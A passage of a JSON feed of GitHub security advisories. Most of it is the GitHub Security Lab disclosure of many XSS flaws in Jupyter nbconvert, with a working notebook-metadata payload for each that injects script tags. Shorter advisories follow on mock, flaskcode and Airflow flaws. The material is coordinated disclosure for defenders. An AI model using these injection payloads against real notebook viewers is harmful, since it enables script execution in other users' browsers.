href=\"https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/lab/index.html.j2#L12-L13\"><code>index.html.j2</code></a> HTML template with no escaping: </p>\n<pre><code class=\"language-html\">{% set nb_title = nb.metadata.get('title', '') or resources['metadata']['name'] %}\n&lt;title&gt;{{nb_title}}&lt;/title&gt;\n</code></pre>\n<p>The following <code>notebook.metadata.title</code> node will execute arbitrary javascript:</p>\n<pre><code class=\"language-json\"> \"metadata\": {\n  \"title\": \"TITLE&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"\n }\n</code></pre>\n<p>Note: this issue also affect other templates, not just the <code>lab</code> one.</p>\n<h3 id=\"issue-3-xss-in-notebookmetadatawidgetsghsl-2021-1015\">Issue 3: XSS in notebook.metadata.widgets(<code>GHSL-2021-1015</code>)</h3>\n<p>The <code>notebook.metadata.widgets</code> node is rendered directly to the <a href=\"https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/lab/index.html.j2#L12-L13\"><code>base.html.j2</code></a> HTML template with no escaping: </p>\n<pre><code class=\"language-html\">{% set mimetype = 'application/vnd.jupyter.widget-state+json'%}\n{% if mimetype in nb.metadata.get(\"widgets\",{})%}\n&lt;script type=\"{{ mimetype }}\"&gt;\n{{ nb.metadata.widgets[mimetype] | json_dumps }}\n&lt;/script&gt;\n{% endif %}\n</code></pre>\n<p>The following <code>notebook.metadata.widgets</code> node will execute arbitrary javascript:</p>\n<pre><code class=\"language-json\"> \"metadata\": {\n  \"widgets\": {\n    \"application/vnd.jupyter.widget-state+json\": {\"foo\": \"pwntester&lt;/script&gt;&lt;script&gt;alert(1);//\"}\n  }\n }\n</code></pre>\n<p>Note: this issue also affect other templates, not just the <code>lab</code> one.</p>\n<h3 id=\"issue-4-xss-in-notebookcellmetadatatagsghsl-2021-1016\">Issue 4: XSS in notebook.cell.metadata.tags(<code>GHSL-2021-1016</code>)</h3>\n<p>The <code>notebook.cell.metadata.tags</code> nodes are output directly to the <a href=\"https://github.com/jupyter/nbconvert/blob/3c0f82d1acbcf2264ae0fa892141a037563aabd0/share/jupyter/nbconvert/templates/base/celltags.j2#L4\"><code>celltags.j2</code></a> HTML template with no escaping: </p>\n<pre><code>{%- macro celltags(cell) -%}\n    {% if cell.metadata.tags | length &gt; 0 -%}\n        {% for tag in cell.metadata.tags -%}\n            {{ ' celltag_' ~ tag -}}\n        {%- endfor -%}\n    {%- endif %}\n{%- endmacro %}\n</code></pre>\n<p>The following <code>notebook.cell.metadata.tags</code> node will execute arbitrary javascript:</p>\n<pre><code class=\"language-json\">  {\n   \"cell_type\": \"code\",\n   \"execution_count\": null,\n   \"id\": \"727d1a5f\",\n   \"metadata\": {\n     \"tags\": [\"FOO\\\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;div \\\"\"]\n   },\n   \"outputs\": [],\n   \"source\": []\n  }\n ],\n</code></pre>\n<p>Note: this issue also affect other templates, not just the <code>lab</code> one.</p>\n<h3 id=\"issue-5-xss-in-output-data-texthtml-cellsghsl-2021-1017\">Issue 5: XSS in output data text/html cells(<code>GHSL-2021-1017</code>)</h3>\n<p>Using the <code>text/html</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>\n<p>The following is an example of a cell with <code>text/html</code> output executing arbitrary javascript code:</p>\n<pre><code class=\"language-json\">  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 5,\n   \"id\": \"b72e53fa\",\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/html\": [\n        \"&lt;script&gt;alert(1)&lt;/script&gt;\"\n      ]\n     },\n     \"execution_count\": 5,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"import os; os.system('touch /tmp/pwned')\"\n   ]\n  },\n</code></pre>\n<h3 id=\"issue-6-xss-in-output-data-imagesvgxml-cellsghsl-2021-1018\">Issue 6: XSS in output data image/svg+xml cells(<code>GHSL-2021-1018</code>)</h3>\n<p>Using the <code>image/svg+xml</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. </p>\n<p>The <code>cell.output.data[\"image/svg+xml\"]</code> nodes are rendered directly to the <a href=\"https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2\"><code>base.html.j2</code></a> HTML template with no escaping</p>\n<pre><code>{%- else %}\n{{ output.data['image/svg+xml'] }}\n{%- endif %}\n</code></pre>\n<p>The following <code>cell.output.data[\"image/svg+xml\"]</code> node will execute arbitrary javascript:</p>\n<pre><code class=\"language-json\">    {\n     \"output_type\": \"execute_result\",\n     \"data\": {\n      \"image/svg+xml\": [\"&lt;script&gt;console.log(\\\"image/svg+xml output\\\")&lt;/script&gt;\"]\n     },\n     \"execution_count\": null,\n     \"metadata\": {\n     }\n    }\n</code></pre>\n<h3 id=\"issue-7-xss-in-notebookcelloutputsvg_filenameghsl-2021-1019\">Issue 7: XSS in notebook.cell.output.svg_filename(<code>GHSL-2021-1019</code>)</h3>\n<p>The <code>cell.output.svg_filename</code> nodes are rendered directly to the <a href=\"https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2\"><code>base.html.j2</code></a> HTML template with no escaping</p>\n<pre><code>{%- if output.svg_filename %}\n&lt;img src=\"{{ output.svg_filename | posix_path }}\"&gt;\n</code></pre>\n<p>The following <code>cell.output.svg_filename</code> node will escape the <code>img</code> tag context and execute arbitrary javascript:</p>\n<pre><code class=\"language-json\">  {\n   \"cell_type\": \"code\",\n   \"execution_count\": null,\n   \"id\": \"b72e53fa\",\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"output_type\": \"execute_result\",\n     \"svg_filename\": \"\\\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;\",\n     \"data\": {\n      \"image/svg+xml\": [\"\"]\n     },\n     \"execution_count\": null,\n     \"metadata\": {\n     }\n    }\n   ],\n   \"source\": [\"\"]\n  },\n</code></pre>\n<h3 id=\"issue-8-xss-in-output-data-textmarkdown-cellsghsl-2021-1020\">Issue 8: XSS in output data text/markdown cells(<code>GHSL-2021-1020</code>)</h3>\n<p>Using the <code>text/markdown</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. </p>\n<p>The <code>cell.output.data[\"text/markdown\"]</code> nodes are rendered directly to the <a href=\"https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2\"><code>base.html.j2</code></a> HTML template with no escaping</p>\n<pre><code>{{ output.data['text/markdown'] | markdown2html }}\n</code></pre>\n<p>The following <code>cell.output.data[\"text/markdown\"]</code> node will execute arbitrary javascript:</p>\n<pre><code>    {\n     \"output_type\": \"execute_result\",\n     \"data\": {\n      \"text/markdown\": [\"&lt;script&gt;console.log(\\\"text/markdown output\\\")&lt;/script&gt;\"]\n     },\n     \"execution_count\": null,\n     \"metadata\": {}\n    }\n</code></pre>\n<h3 id=\"issue-9-xss-in-output-data-applicationjavascript-cellsghsl-2021-1021\">Issue 9: XSS in output data application/javascript cells(<code>GHSL-2021-1021</code>)</h3>\n<p>Using the <code>application/javascript</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>\n<p>The <code>cell.output.data[\"application/javascript\"]</code> nodes are rendered directly to the <a href=\"https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2\"><code>base.html.j2</code></a> HTML template with no escaping</p>\n<pre><code>&lt;script type=\"text/javascript\"&gt;\nvar element = document.getElementById('{{ div_id }}');\n{{ output.data['application/javascript'] }}\n&lt;/script&gt;\n</code></pre>\n<p>The following <code>cell.output.data[\"application/javascript\"]</code> node will execute arbitrary javascript:</p>\n<pre><code>    {\n     \"output_type\": \"execute_result\",\n     \"data\": {\n      \"application/javascript\": [\"console.log(\\\"application/javascript output\\\")\"]\n     },\n     \"execution_count\": null,\n     \"metadata\": {}\n    }\n</code></pre>\n<h3 id=\"issue-10-xss-is-outputmetadatafilenames-imagepng-and-imagejpegghsl-2021-1022\">Issue 10: XSS is output.metadata.filenames image/png and image/jpeg(<code>GHSL-2021-1022</code>)</h3>\n<p>The <code>cell.output.metadata.filenames[\"images/png\"]</code> and <code>cell.metadata.filenames[\"images/jpeg\"]</code> nodes are rendered directly to the <a href=\"https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2\"><code>base.html.j2</code></a> HTML template with no escaping:</p>\n<pre><code>{%- if 'image/png' in output.metadata.get('filenames', {}) %}\n&lt;img src=\"{{ output.metadata.filenames['image/png'] | posix_path }}\"\n</code></pre>\n<p>The following <code>filenames</code> node will execute arbitrary javascript:</p>\n<pre><code class=\"language-json\">    {\n     \"output_type\": \"execute_result\",\n     \"data\": {\n      \"image/png\": [\"\"]\n     },\n     \"execution_count\": null,\n     \"metadata\": {\n       \"filenames\": {\n          \"image/png\": \"\\\"&gt;&lt;script&gt;console.log(\\\"output.metadata.filenames.image/png injection\\\")&lt;/script&gt;\" \n       }\n     }\n    }\n</code></pre>\n<h3 id=\"issue-11-xss-in-output-data-imagepng-and-imagejpeg-cellsghsl-2021-1023\">Issue 11: XSS in output data image/png and image/jpeg cells(<code>GHSL-2021-1023</code>)</h3>\n<p>Using the <code>image/png</code> or <code>image/jpeg</code> output data mime type allows arbitrary javascript to be executed when rendering an HTML notebook. </p>\n<p>The <code>cell.output.data[\"images/png\"]</code> and <code>cell.output.data[\"images/jpeg\"]</code> nodes are rendered directly to the <a href=\"https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2\"><code>base.html.j2</code></a> HTML template with no escaping:</p>\n<pre><code>{%- else %}\n&lt;img src=\"data:image/png;base64,{{ output.data['image/png'] }}\"\n{%- endif %}\n</code></pre>\n<p>The following <code>cell.output.data[\"image/png\"]</code> node will execute arbitrary javascript:</p>\n<pre><code class=\"language-json\">    {\n     \"output_type\": \"execute_result\",\n     \"data\": {\n      \"image/png\": [\"\\\"&gt;&lt;script&gt;console.log(\\\"image/png output\\\")&lt;/script&gt;\"]\n     },\n     \"execution_count\": null,\n     \"metadata\": {}\n    }\n</code></pre>\n<h3 id=\"issue-12-xss-is-outputmetadatawidthheight-imagepng-and-imagejpegghsl-2021-1024\">Issue 12: XSS is output.metadata.width/height image/png and image/jpeg(<code>GHSL-2021-1024</code>)</h3>\n<p>The <code>cell.output.metadata.width</code> and <code>cell.output.metadata.height</code> nodes of both <code>image/png</code> and <code>image/jpeg</code> cells are rendered directly to the <a href=\"https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2\"><code>base.html.j2</code></a> HTML template with no escaping:</p>\n<pre><code>{%- set width=output | get_metadata('width', 'image/png') -%}\nwidth={{ width }}\n{%- set height=output | get_metadata('height', 'image/png') -%}\nheight={{ height }}\n</code></pre>\n<p>The following <code>output.metadata.width</code> node will execute arbitrary javascript:</p>\n<pre><code class=\"language-json\">    {\n     \"output_type\": \"execute_result\",\n     \"data\": {\n      \"image/png\": [\"abcd\"]\n     },\n     \"execution_count\": null,\n     \"metadata\": {\n        \"width\": \"&gt;&lt;script&gt;console.log(\\\"output.metadata.width png injection\\\")&lt;/script&gt;\"\n     }\n    }\n</code></pre>\n<h3 id=\"issue-13-xss-in-output-data-applicationvndjupyterwidget-statejson-cellsghsl-2021-1025\">Issue 13: XSS in output data application/vnd.jupyter.widget-state+json cells(<code>GHSL-2021-1025</code>)</h3>\n<p>The <code>cell.output.data[\"application/vnd.jupyter.widget-state+json\"]</code> nodes are rendered directly to the <a href=\"https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2\"><code>base.html.j2</code></a> HTML template with no escaping:</p>\n<pre><code>{% set datatype_list = output.data | filter_data_type %}\n{% set datatype = datatype_list[0]%}\n&lt;script type=\"{{ datatype }}\"&gt;\n{{ output.data[datatype] | json_dumps }}\n&lt;/script&gt;\n</code></pre>\n<p>The following <code>cell.output.data[\"application/vnd.jupyter.widget-state+json\"]</code> node will execute arbitrary javascript:</p>\n<pre><code class=\"language-json\">    {\n     \"output_type\": \"execute_result\",\n     \"data\": {\n      \"application/vnd.jupyter.widget-state+json\": \"\\\"&lt;/script&gt;&lt;script&gt;console.log('output.data.application/vnd.jupyter.widget-state+json injection')//\"\n     },\n     \"execution_count\": null,\n     \"metadata\": {}\n    }\n</code></pre>\n<h3 id=\"issue-14-xss-in-output-data-applicationvndjupyterwidget-viewjson-cellsghsl-2021-1026\">Issue 14: XSS in output data application/vnd.jupyter.widget-view+json cells(<code>GHSL-2021-1026</code>)</h3>\n<p>The <code>cell.output.data[\"application/vnd.jupyter.widget-view+json\"]</code> nodes are rendered directly to the <a href=\"https://github.com/jupyter/nbconvert/blob/main/share/jupyter/nbconvert/templates/classic/base.html.j2\"><code>base.html.j2</code></a> HTML template with no escaping:</p>\n<pre><code>{% set datatype_list = output.data | filter_data_type %}\n{% set datatype = datatype_list[0]%}\n&lt;script type=\"{{ datatype }}\"&gt;\n{{ output.data[datatype] | json_dumps }}\n&lt;/script&gt;\n</code></pre>\n<p>The following <code>cell.output.data[\"application/vnd.jupyter.widget-view+json\"]</code> node will execute arbitrary javascript:</p>\n<pre><code class=\"language-json\">    {\n     \"output_type\": \"execute_result\",\n     \"data\": {\n      \"application/vnd.jupyter.widget-view+json\": \"\\\"&lt;/script&gt;&lt;script&gt;console.log('output.data.application/vnd.jupyter.widget-view+json injection')//\"\n     },\n     \"execution_count\": null,\n     \"metadata\": {}\n    }\n</code></pre>\n<h3 id=\"issue-15-xss-in-raw-cellsghsl-2021-1027\">Issue 15: XSS in raw cells(<code>GHSL-2021-1027</code>)</h3>\n<p>Using a <code>raw</code> cell type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>\n<p>The following is an example of a <code>raw</code> cell executing arbitrary javascript code:</p>\n<pre><code class=\"language-json\">  {\n   \"cell_type\": \"raw\",\n   \"id\": \"372c2bf1\",\n   \"metadata\": {},\n   \"source\": [\n    \"Payload in raw cell &lt;script&gt;alert(1)&lt;/script&gt;\"\n   ]\n  }\n</code></pre>\n<h3 id=\"issue-16-xss-in-markdown-cellsghsl-2021-1028\">Issue 16: XSS in markdown cells(<code>GHSL-2021-1028</code>)</h3>\n<p>Using a <code>markdown</code> cell type allows arbitrary javascript to be executed when rendering an HTML notebook. This is probably by design, however, it would be nice to enable an option which uses an HTML sanitizer preprocessor to strip down all javascript elements:</p>\n<p>The following is an example of a <code>markdown</code> cell executing arbitrary javascript code:</p>\n<pre><code class=\"language-json\">  {\n   \"cell_type\": \"markdown\",\n   \"id\": \"2d42de4a\",\n   \"metadata\": {},\n   \"source\": [\n     \"&lt;script&gt;alert(1)&lt;/script&gt;\"\n   ]\n  },\n</code></pre>\n<h3 id=\"proof-of-concept\">Proof of Concept</h3>\n<p>These vulnerabilities may affect any server using nbconvert to generate HTML and not using a secure content-security-policy (CSP) policy. For example <a href=\"https://nbviewer.jupyter.org\">nbviewer</a> is vulnerable to the above mentioned XSS issues:</p>\n<ol>\n<li>Create Gist with payload. eg:</li>\n</ol>\n<ul>\n<li><code>https://gist.github.com/pwntester/ff027d91955369b85f99bb1768b7f02c</code></li>\n</ul>\n<ol start=\"2\">\n<li>Then load gist on nbviewer. eg:</li>\n</ol>\n<ul>\n<li><code>https://nbviewer.jupyter.org/gist/pwntester/ff027d91955369b85f99bb1768b7f02c</code></li>\n</ul>\n<p>Note: response is served with <code>content-security-policy: connect-src 'none';</code></p>\n<h2 id=\"github-security-advisories\">GitHub Security Advisories</h2>\n<p>We recommend you create a private <a href=\"https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory\">GitHub Security Advisory</a> for these findings. This also allows you to invite the GHSL team to collaborate and further discuss these findings in private before they are <a href=\"https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory\">published</a>.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>These issues were discovered and reported by GHSL team member <a href=\"https://github.com/pwntester\">@pwntester (Alvaro Muñoz)</a>.</p>\n<h2 id=\"contact\">Contact</h2>\n<p>You can contact the GHSL team at <code>securitylab@github.com</code>, please include a reference to <code>GHSL-2021-1013</code>, <code>GHSL-2021-1014</code>, <code>GHSL-2021-1015</code>, <code>GHSL-2021-1016</code>, <code>GHSL-2021-1017</code>, <code>GHSL-2021-1018</code>, <code>GHSL-2021-1019</code>, <code>GHSL-2021-1020</code>, <code>GHSL-2021-1021</code>, <code>GHSL-2021-1022</code>, <code>GHSL-2021-1023</code>, <code>GHSL-2021-1024</code>, <code>GHSL-2021-1025</code>, <code>GHSL-2021-1026</code>, <code>GHSL-2021-1027</code> or <code>GHSL-2021-1028</code> in any communication regarding these issues.</p>\n<h2 id=\"disclosure-policy\">Disclosure Policy</h2>\n<p>This report is subject to our <a href=\"https://securitylab.github.com/advisories#policy\">coordinated disclosure policy</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyter/nbconvert/security/advisories/GHSA-9jmq-rx5f-8jwq\">https://github.com/jupyter/nbconvert/security/advisories/GHSA-9jmq-rx5f-8jwq</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-32862\">https://nvd.nist.gov/vuln/detail/CVE-2021-32862</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/nbconvert/PYSEC-2022-249.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/nbconvert/PYSEC-2022-249.yaml</a></li>\n<li><a href=\"https://github.com/jupyter/nbviewer/security/advisories/GHSA-h274-fcvj-h2wm\">https://github.com/jupyter/nbviewer/security/advisories/GHSA-h274-fcvj-h2wm</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2023/06/msg00003.html\">https://lists.debian.org/debian-lts-announce/2023/06/msg00003.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9jmq-rx5f-8jwq\">https://github.com/advisories/GHSA-9jmq-rx5f-8jwq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9jmq-rx5f-8jwq",
            "title": "[nbconvert] nbconvert vulnerable to cross-site scripting (XSS) via multiple exploit paths",
            "date_modified": "2024-01-25T22:10:35.000Z",
            "date_published": "2022-08-10T17:51:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9jmq-rx5f-8jwq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The Mock software contains a vulnerability wherein an attacker could potentially exploit privilege escalation, enabling the execution of arbitrary code with root user privileges. This weakness stems from the absence of proper sandboxing during the expansion and execution of Jinja2 templates, which may be included in certain configuration parameters. While the Mock documentation advises treating users added to the mock group as privileged, certain build systems invoking mock on behalf of users might inadvertently permit less privileged users to define configuration tags. These tags could then be passed as parameters to mock during execution, potentially leading to the utilization of Jinja2 templates for remote privilege escalation and the execution of arbitrary code as the root user on the build server.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-6395\">https://nvd.nist.gov/vuln/detail/CVE-2023-6395</a></li>\n<li><a href=\"https://github.com/xsuchy/templated-dictionary/commit/0740bd0ca8d487301881541028977d120f8b8933\">https://github.com/xsuchy/templated-dictionary/commit/0740bd0ca8d487301881541028977d120f8b8933</a></li>\n<li><a href=\"https://github.com/xsuchy/templated-dictionary/commit/bcd90f0dafa365575c4b101e6f5d98c4ef4e4b69\">https://github.com/xsuchy/templated-dictionary/commit/bcd90f0dafa365575c4b101e6f5d98c4ef4e4b69</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2023-6395\">https://access.redhat.com/security/cve/CVE-2023-6395</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2252206\">https://bugzilla.redhat.com/show_bug.cgi?id=2252206</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2024/01/16/1\">http://www.openwall.com/lists/oss-security/2024/01/16/1</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2024/01/16/3\">http://www.openwall.com/lists/oss-security/2024/01/16/3</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NBFYREAJH4T7GXXQZ4GJEREN4Q3AHS3K/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NBFYREAJH4T7GXXQZ4GJEREN4Q3AHS3K/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7j98-74jh-cjxh\">https://github.com/advisories/GHSA-7j98-74jh-cjxh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7j98-74jh-cjxh",
            "title": "[templated_dictionary] Privilege escalation for users that can access mock configuration",
            "date_modified": "2024-01-30T06:30:23.000Z",
            "date_published": "2024-01-16T15:30:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7j98-74jh-cjxh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in the flaskcode package through 0.0.8 for Python. An unauthenticated directory traversal, exploitable with a POST request to a /update-resource-data/ URI (from views.py), allows attackers to write to arbitrary files.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52289\">https://nvd.nist.gov/vuln/detail/CVE-2023-52289</a></li>\n<li><a href=\"https://gitlab.com/daniele_m/cve-list/-/blob/main/README.md\">https://gitlab.com/daniele_m/cve-list/-/blob/main/README.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v3rg-qm46-xrg9\">https://github.com/advisories/GHSA-v3rg-qm46-xrg9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v3rg-qm46-xrg9",
            "title": "[flaskcode] Path traversal in flaskcode",
            "date_modified": "2024-01-24T21:53:44.000Z",
            "date_published": "2024-01-13T06:30:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v3rg-qm46-xrg9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in the flaskcode package through 0.0.8 for Python. An unauthenticated directory traversal, exploitable with a GET request to a /resource-data/.txt URI (from views.py), allows attackers to read arbitrary files.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52288\">https://nvd.nist.gov/vuln/detail/CVE-2023-52288</a></li>\n<li><a href=\"https://gitlab.com/daniele_m/cve-list/-/blob/main/README.md\">https://gitlab.com/daniele_m/cve-list/-/blob/main/README.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6h4q-63c5-qfqf\">https://github.com/advisories/GHSA-6h4q-63c5-qfqf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6h4q-63c5-qfqf",
            "title": "[flaskcode] Path traversal in flaskcode",
            "date_modified": "2024-01-24T21:53:28.000Z",
            "date_published": "2024-01-13T06:30:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6h4q-63c5-qfqf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Since version 5.2.0, when using deferrable mode with the path of a Kubernetes configuration file for authentication, the Airflow worker serializes this configuration file as a dictionary and sends it to the triggerer by storing it in metadata without any encryption. Additionally, if used with an Airflow version between 2.3.0 and 2.6.0, the configuration dictionary will be logged as plain text in the triggerer service without masking. This allows anyone with access to the metadata or triggerer log to obtain the configuration file and use it to access the Kubernetes cluster.</p>\n<p>This behavior was changed in version 7.0.0, which stopped serializing the file contents and started providing the file path instead to read the contents into the trigger. Users are recommended to upgrade to version 7.0.0, which fixes this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-51702\">https://nvd.nist.gov/vuln/detail/CVE-2023-51702</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/29498\">https://github.com/apache/airflow/pull/29498</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/30110\">https://github.com/apache/airflow/pull/30110</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/36492\">https://github.com/apache/airflow/pull/36492</a></li>\n<li><a href=\"https://lists.apache.org/thread/89x3q6lz5pykrkr1fkr04k4rfn9pvnv9\">https://lists.apache.org/thread/89x3q6lz5pykrkr1fkr04k4rfn9pvnv9</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2024/01/24/3\">http://www.openwall.com/lists/oss-security/2024/01/24/3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mg2x-mggj-6955\">https://github.com/advisories/GHSA-mg2x-mggj-6955</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mg2x-mggj-6955",
            "title": "[apache-airflow-providers-cncf-kubernetes] Apache Airflow CNCF Kubernetes provider, Apache Airflow: Kubernetes configuration file saved without encryption in the Metadata and logged as plain text in the Triggerer service",
            "date_modified": "2024-01-24T21:13:06.000Z",
            "date_published": "2024-01-24T15:30:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mg2x-mggj-6955"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Since version 5.2.0, when using deferrable mode with the path of a Kubernetes configuration file for authentication, the Airflow worker serializes this configuration file as a dictionary and sends it to the triggerer by storing it in metadata without any encryption. Additionally, if used with an Airflow version between 2.3.0 and 2.6.0, the configuration dictionary will be logged as plain text in the triggerer service without masking. This allows anyone with access to the metadata or triggerer log to obtain the configuration file and use it to access the Kubernetes cluster.</p>\n<p>This behavior was changed in version 7.0.0, which stopped serializing the file contents and started providing the file path instead to read the contents into the trigger. Users are recommended to upgrade to version 7.0.0, which fixes this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-51702\">https://nvd.nist.gov/vuln/detail/CVE-2023-51702</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/29498\">https://github.com/apache/airflow/pull/29498</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/30110\">https://github.com/apache/airflow/pull/30110</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/36492\">https://github.com/apache/airflow/pull/36492</a></li>\n<li><a href=\"https://lists.apache.org/thread/89x3q6lz5pykrkr1fkr04k4rfn9pvnv9\">https://lists.apache.org/thread/89x3q6lz5pykrkr1fkr04k4rfn9pvnv9</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2024/01/24/3\">http://www.openwall.com/lists/oss-security/2024/01/24/3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mg2x-mggj-6955\">https://github.com/advisories/GHSA-mg2x-mggj-6955</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mg2x-mggj-6955",
            "title": "[apache-airflow] Apache Airflow CNCF Kubernetes provider, Apache Airflow: Kubernetes configuration file saved without encryption in the Metadata and logged as plain text in the Triggerer service",
            "date_modified": "2024-01-24T21:13:06.000Z",
            "date_published": "2024-01-24T15:30:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mg2x-mggj-6955"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Apache Airflow, versions before 2.8.1, have a vulnerability that allows an authenticated user to access the source code of a DAG to which they don't have access.&nbsp;This vulnerability is considered low since it requires an authenticated user to exploit it. Users are recommended to upgrade to version 2.8.1, which fixes this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-50944\">https://nvd.nist.gov/vuln/detail/CVE-2023-50944</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/36257\">https://github.com/apache/airflow/pull/36257</a></li>\n<li><a href=\"https://lists.apache.org/thread/92krb5mpcq8qrw4t4j5oooqw7hgd8q7h\">https://lists.apache.org/thread/92krb5mpcq8qrw4t4j5oooqw7hgd8q7h</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2024/01/24/5\">http://www.openwall.com/lists/oss-security/2024/01/24/5</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2024-14.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2024-14.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vm5m-qmrx-fw8w\">https://github.com/advisories/GHSA-vm5m-qmrx-fw8w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vm5m-qmrx-fw8w",
            "title": "[apache-airflow] Apache Airflow: Bypass permission verification to read code of other dags",
            "date_modified": "2024-01-24T21:01:06.000Z",
            "date_published": "2024-01-24T15:30:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vm5m-qmrx-fw8w"
            },
            "tags": [
                "severity"
            ]
        },
        {
